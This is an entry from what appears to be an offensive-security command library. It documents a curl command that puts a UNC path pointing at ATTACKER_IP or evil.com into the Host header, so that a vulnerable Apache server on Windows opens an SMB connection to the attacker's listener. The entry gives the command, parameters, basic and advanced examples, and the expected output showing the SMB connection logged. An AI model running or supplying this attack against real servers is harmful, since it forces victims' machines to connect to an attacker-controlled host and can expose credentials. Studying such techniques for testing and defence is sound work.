---
data: 'curl -v -H "Host: \\\\ATTACKER_IP\\SHARE" http://TARGET_IP/'
tags:
  - ssrf
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2024-10-04'
updated_at: '2025-12-14T03:53:38.751Z'
id: 270f715f-6733-42ee-9b78-1bc41524e74b
verified: false
validated: true
submitted: true
---
# curl-trigger-unc-ssrf

## Command

```bash
curl -v -H "Host: \\\\ATTACKER_IP\\SHARE" http://TARGET_IP/
```

## Description

This curl command sends an HTTP GET request with a custom Host header formatted as a UNC path to trigger SSRF in vulnerable Apache servers on Windows, forcing an SMB connection to the specified attacker IP and share.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output for request/response details | No |
| `-H "Host: \\\\ATTACKER_IP\\SHARE"` | Malicious UNC path in Host header | Yes |
| `http://TARGET_IP/` | Target Apache server URL | Yes |

## Examples

### Basic Usage

```bash
curl -v -H "Host: \\\\192.168.1.100\\share" http://10.0.0.1/
```

### Advanced Usage

```bash
curl -v -H "Host: \\\\evil.com\\public" -k https://target.com/ --resolve target.com:443:TARGET_IP
```

## Expected Output

* Connected to TARGET_IP port 80
> GET / HTTP/1.1
> Host: \\\\ATTACKER_IP\\SHARE
< HTTP/1.1 400 Bad Request
< Content-Length: 0

(Concurrent SMB connection logged on listener)

## Related

- [[Related Procedure|procedures/Trigger-Apache-UNC-Path-SSRF]]
